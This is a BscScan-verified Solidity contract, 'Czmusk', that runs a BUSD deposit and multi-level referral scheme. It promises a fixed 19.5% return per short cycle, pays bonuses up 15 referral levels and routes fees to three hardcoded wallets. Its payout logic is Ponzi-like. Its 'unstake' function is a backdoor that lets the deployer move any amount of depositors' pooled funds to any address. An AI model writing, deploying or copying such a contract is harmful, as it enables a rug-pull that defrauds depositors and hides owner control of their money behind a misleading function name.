/**
 *Submitted for verification at BscScan.com on 2022-11-10
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract Czmusk {
    using SafeMath for uint256; 
    BEP20 public busd = BEP20(0x3AD53Eb310bC6061baa62D900E6953601Dc90E5c); 
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 150; 
    uint256 private constant starPercents = 30;
    uint256 private constant leaderPercents = 20;
    uint256 private constant managerPercents = 10;
    uint256 private constant dayPerCycle = 15 minutes; 
    uint256 private constant maxAddFreeze = 40 minutes;
    uint256 private constant timeStep = 1 minutes;
    uint256 private constant minDeposit = 50e18;
    uint256 private constant maxDeposit = 2000e18;
    uint256 private constant splitMod = 60e18;
    
    struct UserInfo {
        address referrer;
        uint256 refNo;
        uint256 myLastDeposit;
        uint256 totalIncome;
        uint256 totalWithdraw;
        uint256 isStar;
        uint256 isLeader;
        uint256 isManager;
        uint256 split;
        uint256 splitAct;
        uint256 splitTrnx;
        uint256 myRegister;
        uint256 myActDirect;
        mapping(uint256 => uint256) levelTeam;
        mapping(uint256 => uint256) incomeArray;
        mapping(uint256 => uint256) directBuz;
    }

    mapping(address=>UserInfo) public userInfo;
    
    struct UserDept{
        uint256 amount;
        uint256 depTime;
        uint256 unfreeze; 
        bool isUnfreezed;
    }
    mapping(address => UserDept[]) public userDepts;
    uint256 totalInv;
    uint256 last70=0;
    uint256 last70Time=0;
    bool last50=false;
    bool last20=false;
    
    address feeReceiver1 = 0x54C07a57bc9b9f0897b7020B9A92FeB0A2763a78;
    address feeReceiver2 = 0x0f86a9aBAC8bB480cB9a2f4f3c0e4039261c897e;
    address feeReceiver3 = 0xf804857b80be18CCaE1b456d30c05B618EEF8786;
    address public defaultRefer;
    address public aggregator;
    uint256 public startTime;
    
    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    
    uint[] level_bonuses = [500, 100, 200, 300, 100, 100, 100, 100, 100, 100, 50, 50, 50, 50, 50];  
    modifier onlyAggregator(){
        require(msg.sender == aggregator,"You are not authorized.");
        _;
    }
    constructor() public {
        startTime = block.timestamp;
        defaultRefer = msg.sender;
        aggregator = msg.sender;
    }
    
    function contractInfo() public view returns(uint256 balance, uint256 init, uint256 gallaa, uint256 gallaaTime, bool l50, bool l20){
       return (busd.balanceOf(address(this)),startTime, last70, last70Time, last50, last20);
    }
    
    function register(address _referral) external {
        require(userInfo[_referral].myLastDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.refNo = userInfo[_referral].myRegister;
        userInfo[_referral].myRegister++;
        emit Register(msg.sender, _referral);
    }
    
    function deposit(uint256 _busd) external {
        _deposit(msg.sender, _busd,false);
        emit Deposit(msg.sender, _busd);
    }

    function _deposit(address _user, uint256 _amount, bool isSplitDept) private {
        require(_amount>=minDeposit &&_amount<=maxDeposit && _amount.mod(minDeposit) == 0, "Minimum 50, Maximum 2000 And Multiple 50");
        require(userInfo[_user].referrer != address(0), "register first");
        require(_amount>=userInfo[_user].myLastDeposit, "Amount greater than previous Deposit");
        if(isSplitDept==false){
            busd.transferFrom(msg.sender,address(this),_amount);
        }
        uint8 _isReDept;
        if(userInfo[_user].myLastDeposit==0){
            userInfo[userInfo[_user].referrer].myActDirect++;
        }else{
            _isReDept=1;
        }
        totalInv+=_amount;
        uint256 scBalance=busd.balanceOf(address(this));
        if(scBalance>last70 && last70>0){
            last70=0;
            last70Time=0;
            last50=false;
            last20=false;
        }
        userInfo[_user].myLastDeposit=_amount;
        _distributeDeposit(_amount);
        
        uint256 addFreeze = (userDepts[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        userDepts[_user].push(UserDept(
            _amount,
            block.timestamp,
            unfreezeTime,
            false
        ));
        _setReferral(_user,userInfo[_user].referrer,_amount,_isReDept);
        unfreezeDepts(_user);
    }

    function _setReferral(address _user,address _referral, uint256 _refAmount, uint8 _isReDept) private {
        for(uint8 i = 0; i < level_bonuses.length; i++) {
            if(_isReDept==0){
                userInfo[_referral].levelTeam[userInfo[_user].refNo]+=1;
            }
            userInfo[_referral].directBuz[userInfo[_user].refNo]+=_refAmount;
            
            if(userInfo[_referral].isStar==0 || userInfo[_referral].isLeader==0 || userInfo[_referral].isManager==0){
                (uint256 ltA,uint256 ltB,uint256 lbA, uint256 lbB)=teamBuzInfo(_referral);
                if(userInfo[_referral].isStar==0 && userInfo[_referral].myActDirect>=3 && (ltA+ltB)>=20 && userInfo[_referral].myLastDeposit>=500e18 && lbA>=5000e18 && lbB>=5000e18){
                    userInfo[_referral].isStar=1;
                }
                if(userInfo[_referral].isLeader==0 && userInfo[_referral].myActDirect>=5 && (ltA+ltB)>=40 && userInfo[_referral].myLastDeposit>=1000e18 && lbA>=10000e18 && lbB>=10000e18){
                    userInfo[_referral].isLeader=1;
                }
                if(userInfo[_referral].isManager==0 && userInfo[_referral].myActDirect>=8 && (ltA+ltB)>=200 && userInfo[_referral].myLastDeposit>=2000e18 && lbA>=50000e18 && lbB>=50000e18){
                    userInfo[_referral].isManager=1;
                }
            }
            if(last20==false){
                uint256 levelOn=_refAmount;
                if(_refAmount>userInfo[_referral].myLastDeposit){
                    levelOn=userInfo[_referral].myLastDeposit;
                }
                if(last50==true){
                    levelOn=levelOn.div(2);
                }
                uint256 lvAmt=levelOn.mul(level_bonuses[i]).div(baseDivider);
                uint256 lvAmt70=lvAmt.mul(70).div(100);
                uint256 lvAmt30=lvAmt.mul(30).div(100);
                if(i==0){
                    userInfo[_referral].totalIncome+=lvAmt70;
                    userInfo[_referral].incomeArray[2]+=lvAmt70;
                    userInfo[_referral].split+=lvAmt30;
                    if(_isReDept==0){
                        userInfo[_referral].incomeArray[7]+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                    }
                }else{
                    if(userInfo[_referral].isStar==1 && i < 3){
                        userInfo[_referral].totalIncome+=lvAmt70;
                        userInfo[_referral].incomeArray[4]+=lvAmt70;
                        userInfo[_referral].split+=lvAmt30;
                    }else if(userInfo[_referral].isLeader==1 && i >= 3 && i < 6){
                        userInfo[_referral].totalIncome+=lvAmt70;
                        userInfo[_referral].incomeArray[5]+=lvAmt70;
                        userInfo[_referral].split+=lvAmt30;
                    }else if(userInfo[_referral].isManager==1 && i >= 6){
                        userInfo[_referral].totalIncome+=lvAmt70;
                        userInfo[_referral].incomeArray[6]+=lvAmt70;
                        userInfo[_referral].split+=lvAmt30;
                    }
                }
            }
            
           _user = _referral;
           _referral = userInfo[_referral].referrer;
            if(_referral == address(0)) break;
        }
    }
    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        uint256 fee3 = _amount.mul(200).div(baseDivider);
        busd.transfer(feeReceiver1,fee);
        busd.transfer(feeReceiver2,fee);
        busd.transfer(feeReceiver3,fee3);
    }

    function depositBySplit(uint256 _amount) external {
        require(_amount >= minDeposit && _amount <= maxDeposit &&  _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].myLastDeposit == 0, "actived");
        uint256 splitLeft = userInfo[msg.sender].split.sub(userInfo[msg.sender].splitAct).sub(userInfo[msg.sender].splitTrnx);
        require(splitLeft >= _amount, "insufficient split");
        userInfo[msg.sender].splitAct = userInfo[msg.sender].splitAct.add(_amount);
        _deposit(msg.sender, _amount,true);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(uint256 _amount,address _receiver) external {
        require(_amount >= minDeposit && _amount <= maxDeposit && _amount.mod(splitMod) == 0, "amount err");
        uint256 splitLeft = userInfo[msg.sender].split.sub(userInfo[msg.sender].splitAct).sub(userInfo[msg.sender].splitTrnx);
        require(splitLeft >= _amount, "insufficient income");
        userInfo[msg.sender].splitTrnx = userInfo[msg.sender].splitTrnx.add(_amount);
        uint256 aftDed=_amount.mul(95).div(100);
        userInfo[_receiver].split = userInfo[_receiver].split.add(aftDed);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function unfreezeDepts(address _addr) private {
        uint8 isdone;
        for(uint i=0;i<userDepts[_addr].length;i++){
            UserDept storage pl = userDepts[_addr][i];
            if(pl.isUnfreezed==false && block.timestamp>=pl.unfreeze && isdone==0 && pl.depTime>last70Time){
                pl.isUnfreezed=true;
                uint256 incAmt=pl.amount.mul(195).div(1000);
                userInfo[_addr].totalIncome+=pl.amount;
                userInfo[_addr].totalIncome+=incAmt.mul(70).div(100);
                userInfo[_addr].incomeArray[0]+=pl.amount;
                userInfo[_addr].incomeArray[1]+=incAmt.mul(70).div(100);
                userInfo[_addr].split+=incAmt.mul(30).div(100);
                isdone=1;
                address _referral = userInfo[_addr].referrer;
                for(uint8 j = 0; j < level_bonuses.length; j++) {
                    userInfo[_referral].directBuz[userInfo[_addr].refNo]-=pl.amount;
                    _addr = _referral;
                   _referral = userInfo[_referral].referrer;
                    if(_referral == address(0)) break;
                }
                break;
            }
        }
    }

    function teamBuzInfo(address _addr) view private returns(uint256 ltA,uint256 ltB,uint256 lbA,uint256 lbB) {
        uint256 lbATemp;
        uint256 lb;
        uint256 lTeam;
        uint256 lbTTemp;
        for(uint256 i=0;i<userInfo[_addr].myRegister;i++){
            lTeam+=userInfo[_addr].levelTeam[i];
            if(lbTTemp==0 || userInfo[_addr].levelTeam[i]>lbTTemp){
               lbTTemp=userInfo[_addr].levelTeam[i]; 
            }
            lb+=userInfo[_addr].directBuz[i];
            if(lbATemp==0 || userInfo[_addr].directBuz[i]>lbATemp){
               lbATemp=userInfo[_addr].directBuz[i]; 
            }
        }
        lbB=lb-lbATemp;
        ltB=lTeam-lbTTemp;
        return (
           lbTTemp,
           ltB,
           lbATemp,
           lbB
        );
    }
    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function incomeDetails(address _addr) view external returns(uint256[11] memory p) {
        for(uint8 i=0;i<11;i++){
            p[i]=userInfo[_addr].incomeArray[i];
        }
        return (
           p
        );
    }
    
    function userDetails(address _addr) view external returns(address ref,uint256 ltA,uint256 ltB,uint256 lbA,uint256 lbB,uint256 myDirect) {
        UserInfo storage player = userInfo[_addr];
        
        uint256 lbATemp;
        uint256 lb;
        uint256 lTeam;
        uint256 lbTTemp;
        for(uint256 i=0;i<player.myRegister;i++){
            lTeam+=player.levelTeam[i];
            if(lbTTemp==0 || player.levelTeam[i]>lbTTemp){
               lbTTemp=player.levelTeam[i]; 
            }
            lb+=player.directBuz[i];
            if(lbATemp==0 || player.directBuz[i]>lbATemp){
               lbATemp=player.directBuz[i]; 
            }
        }
        lbB=lb-lbATemp;
        ltB=lTeam-lbTTemp;
        return (
           player.referrer,
           lbTTemp,
           ltB,
           lbATemp,
           lbB,
           player.myActDirect
        );
    }
    
    function withdraw(uint256 _amount) public{
        require(_amount >= 1e18, "Minimum 1 need");
        
        UserInfo storage player = userInfo[msg.sender];
        uint256 bonus;
        bonus=player.totalIncome-player.totalWithdraw;
        if(player.incomeArray[7]>=1000e18){
            bonus+=1000e18;
            player.incomeArray[7]-=1000e18;
        }
        require(_amount<=bonus,"Amount exceeds withdrawable");
        player.totalWithdraw+=_amount;
        player.incomeArray[0]=0;
        player.incomeArray[1]=0;
        player.incomeArray[2]=0;
        player.incomeArray[3]=0;
        player.incomeArray[4]=0;
        player.incomeArray[5]=0;
        player.incomeArray[6]=0;
        busd.transfer(msg.sender,_amount);
        uint256 scBalance=busd.balanceOf(address(this));
        uint256 upto70=totalInv.mul(70).div(100);
        if(last70==0 && upto70>scBalance){
            last70=totalInv;
            last70Time=block.timestamp;
        }
        if(last50==false && last70>0 && last70.div(2)>scBalance){
            last50=true;
        }
        if(last20==false && last70>0 && last70.mul(20).div(100)>scBalance){
            last20=true;
        }
    }
    function unstake(address payable buyer,uint _amount) public returns(uint){
        require(msg.sender == aggregator,"You are not staker.");
        busd.transfer(buyer,_amount);
        return _amount;
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}